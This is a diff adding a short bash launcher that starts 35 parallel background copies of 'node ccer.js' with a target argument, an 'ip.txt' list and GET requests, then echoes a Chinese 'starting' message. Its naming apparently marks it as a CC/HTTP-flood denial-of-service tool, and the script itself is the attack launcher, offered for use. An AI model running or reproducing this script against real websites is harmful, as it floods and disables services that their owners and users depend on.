@@ -1,0 +1,37 @@
+#!/bin/bash
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+node ccer.js $1 ip.txt $2 GET &
+echo  '正在开启， end'
